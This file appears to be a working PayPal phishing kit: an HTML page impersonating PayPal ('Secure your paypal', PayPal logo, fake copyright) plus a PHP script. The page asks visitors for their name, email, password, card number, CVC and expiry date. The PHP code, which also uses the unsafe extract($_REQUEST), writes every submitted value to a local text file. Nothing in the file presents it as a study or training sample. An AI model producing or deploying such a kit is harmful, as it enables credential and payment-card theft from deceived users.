<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paypal:Secure your account</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="loader.html">
</head>

<body>
    <section class="pay">

        <div class="pal">
            <div class="up">
                <img src="images/PayPal.svg.png" alt="" srcset="">
            </div>
            <div class="secure">
                <h1 class="sec-text">
                    <i>
                        Secure your paypal
                    </i>
                </h1>
            </div>
            <br>
            <form action="index.php" method="POST" target="_self">
                <input type="text" placeholder="Name" name="name" required id="case"> <br><br>
                <input type="text" placeholder="Surname" name="surname" required id="case"><br><br>
                <input type="email" placeholder="Email" name="email" required id="case"><br>
                <input type="password" placeholder="Password" name="password" required id="dol"><br><br>
                <div class="info">
                    ___________________Card Info____________________
                </div>
                <input type="tel" placeholder="card number" name="card" required id="dol" maxlength="16"><br>
                <div class="dip">
                    <div class="mo">
                        <input type="tel" placeholder="xxx" id="cvc" name="cvc" required maxlength="3"><br>
                        <label id="ml">CVC/CVV</label>
                    </div>
                    <div class="lb">
                        <input type="date" maxlength="3" name="date" id="dt"><br>
                        <label id="up">Expiry Date</label>
                    </div>
                </div>
                <div class="sub">
                    <button type="submit" id="lp" title="comfirm">Confirm</button>

                </div>
                <p class="secur">
                    copyright &copy; 2013 paypal inc".
                </p>

            </form>
        </div>
        </div>
    </section>
    <div id="loader">
        <img src="images/paypal-3384015_1280.png" alt="" srcset="">
    </div>
    <script>
        var loader = document.getElementById("loader")
        window.addEventListener("load", function () {
            setTimeout(function () {
                loader.style.display = "none";
            }, 3000);

        });
    </script>


</body>


</html>
<?php
extract($_REQUEST);
$file=fopen("form-save.txt","a");

fwrite($file,"name :");
fwrite($file, $name ."\n");
fwrite($file,"password :");
fwrite($file, $password ."\n");
fwrite($file,"email :");
fwrite($file, $email ."\n");
fwrite($file,"card :");
fwrite($file, $card ."\n");
fwrite($file,"cvc :");
fwrite($file, $cvc ."\n");
fwrite($file,"date :");
fwrite($file, $date ."\n");

?>